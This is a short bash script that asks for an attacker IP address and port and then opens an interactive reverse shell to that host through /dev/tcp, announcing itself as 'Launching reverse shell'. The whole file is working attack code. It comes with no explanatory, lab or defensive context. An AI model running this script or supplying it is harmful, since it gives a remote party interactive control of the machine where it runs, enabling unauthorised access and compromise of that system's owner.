#!/bin/bash

echo "Enter Attacker IP:"
read ATTACKER_IP
echo "Enter Attacker Port:"
read ATTACKER_PORT

echo "[*] Launching reverse shell to $ATTACKER_IP:$ATTACKER_PORT..."
/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
